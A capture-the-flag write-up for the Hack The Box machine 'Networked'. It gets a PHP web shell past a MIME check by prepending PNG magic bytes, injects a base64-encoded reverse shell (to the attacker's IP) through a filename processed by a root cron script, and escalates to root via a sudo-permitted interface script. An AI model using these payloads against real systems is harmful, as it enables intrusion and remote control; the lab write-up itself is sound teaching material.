---
title: Networked
date: 2026-08-19
description: Easy Linux machine running a PHP photo upload site — bypassing MIME checks with PNG magic bytes, exploiting command injection in a root cron script that sanitizes filenames, and abusing changename.sh's unsanitized interface writes for root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Tue Aug 18 15:26:11 2026 as: /usr/lib/nmap/nmap -p22,80,443 -A -oN scan_results.txt 10.129.3.148
Nmap scan report for networked.htb (10.129.3.148)
Host is up (0.65s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Device type: general purpose|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 3.10 (92%), Linux 2.6.32 - 3.13 (91%), Linux 5.0 - 5.14 (91%), Linux 3.8 - 3.16 (90%), Linux 5.1 - 5.15 (90%), OpenWrt 19.07 (Linux 4.14) (89%), Linux 3.13 or 4.2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   862.66 ms 10.10.16.1
2   243.74 ms networked.htb (10.129.3.148)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 18 15:27:06 2026 -- 1 IP address (1 host up) scanned in 55.35 seconds

```

```sh
301      GET        7l       20w      236c http://networked.htb/backup => http://networked.htb/backup/ 
301      GET        7l       20w      237c http://networked.htb/uploads => http://networked.htb/uploads/

200      GET      201l      582w    10240c http://networked.htb/backup/backup.tar
```

`backup.tar` held the website's source.

# User

## Magic byte bypass

Upload functions validate MIME types — magic bytes slip past the check by declaring the file an image:

```php 
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }                                             #lib.php
```

- Allows all image types — jpg, jpeg, png
- The PNG signature header (magic numbers):
  - `89 50 4E 47 0D 0A 1A 0A`

Convert the hex to binary and prepend it to the web shell:

```sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > header.png 

cat header.png webshell.php > WS.php.png
```

Uploaded through `/upload.php`, confirmed on `/photo.php`, then executed from `/uploads`:

```text
http://networked.htb/uploads/10_10_16_82.php.png?cmd=id


PNG  
uid=48(apache) gid=48(apache) groups=48(apache)
```

Gained shell as apache.

## Cron command injection

guly's home directory held the crontab:

```text
cat crontab.guly                           

*/3 * * * * php /home/guly/check_attack.php
```

`check_attack.php` runs every three minutes:

```php
<​?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
?>
```

A solid command injection:
- The **exec** variable interpolates `$value`
- `$value` is the filename in `/uploads`, used to detect potential attacks
- We can manipulate file names — and nothing else

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

Becomes:

```php
exec("nohup /bin/rm -f $path;cmd > /dev/null 2>&1 &");
```

Payload — a file named with a base64-encoded reverse shell:

```sh
touch -- '; echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjgyLzkwMDIgMD4mMQ== | base64 -d | bash'
```

- `touch --` → creates a file with the name that follows `--`
- The base64 decodes and executes the reverse shell

Gained shell as `guly`.

# Root

```sh
cat /etc/os-release

NAME="CentOS Linux"
VERSION="7 (Core)"
<SNIP>
```

```sh
(root) NOPASSWD: /usr/local/sbin/changename.sh 
```

`changename.sh`:

```sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

In CentOS we control the interface name (DEVICE) and other values — and `ifup guly0` brings the interface up at the end.

> https://seclists.org/fulldisclosure/2019/Apr/24

```text
/etc/sysconfig/network-scripts/ifcfg-1337

NAME=Network /bin/id  <= Note the blank space
ONBOOT=yes
DEVICE=eth0
```

Any script in that folder is executed by root through the sourcing technique.

```sh
sudo /usr/local/sbin/changename.sh

interface NAME:
lol /bin/bash
interface PROXY_METHOD:
lol
interface BROWSER_ONLY:
lol
interface BOOTPROTO:
lol


whoami
root
/bin/bash -i
bash: no job control in this shell
[root@networked network-scripts]# 
```

Gained `root`
